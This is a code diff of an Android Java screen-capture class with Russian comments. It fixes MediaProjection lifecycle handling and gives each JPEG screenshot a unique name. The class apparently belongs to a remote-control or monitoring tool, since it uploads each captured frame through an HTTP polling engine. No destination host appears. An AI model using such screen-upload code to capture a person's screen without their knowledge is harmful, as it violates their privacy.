@@ -22,14 +22,23 @@ public class ScreenCapture {
     private static VirtualDisplay virtualDisplay;
     private static ImageReader imageReader;
 
-    public static void initProjection(MediaProjection projection) {
+    // Исправлено: добавлен второй аргумент Context и колбэк остановки
+    public static void initProjection(MediaProjection projection, Context context) {
         activeProjection = projection;
+        if (activeProjection != null) {
+            activeProjection.registerCallback(new MediaProjection.Callback() {
+                @Override
+                public void onStop() {
+                    release();
+                }
+            }, null);
+        }
     }
 
     public static void captureAndUpload(Context context, HttpPollingEngine engine) {
         if (activeProjection == null) return;
 
-        releaseDisplayResources(); // Чистим старое
+        releaseDisplayResources(); 
 
         WindowManager wm = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
         DisplayMetrics metrics = new DisplayMetrics();
@@ -44,11 +53,11 @@ public class ScreenCapture {
         imageReader.setOnImageAvailableListener(reader -> {
             Image image = reader.acquireLatestImage();
             if (image != null) {
-                reader.setOnImageAvailableListener(null, null); // Стоп после первого кадра
+                reader.setOnImageAvailableListener(null, null); 
                 Bitmap bmp = imageToBitmap(image, w, h);
                 image.close();
                 
-                File file = bitmapToJpeg(context, bmp, 60); // 60% качество для скорости
+                File file = bitmapToJpeg(context, bmp, 60); 
                 if (file != null) {
                     new Thread(() -> engine.uploadScreenshot(file)).start();
                 }
@@ -70,14 +79,23 @@ public class ScreenCapture {
     }
 
     private static File bitmapToJpeg(Context ctx, Bitmap bmp, int quality) {
-        File f = new File(ctx.getCacheDir(), "sc.jpg");
+        File f = new File(ctx.getCacheDir(), "sc_" + System.currentTimeMillis() + ".jpg");
         try (FileOutputStream fos = new FileOutputStream(f)) {
             bmp.compress(Bitmap.CompressFormat.JPEG, quality, fos);
             return f;
         } catch (IOException e) { return null; }
     }
 
-    public static void releaseDisplayResources() {
+    // Исправлено: добавлен метод release(), который требовал сервис
+    public static void release() {
+        releaseDisplayResources();
+        if (activeProjection != null) {
+            activeProjection.stop();
+            activeProjection = null;
+        }
+    }
+
+    private static void releaseDisplayResources() {
         if (virtualDisplay != null) virtualDisplay.release();
         if (imageReader != null) imageReader.close();
         virtualDisplay = null;
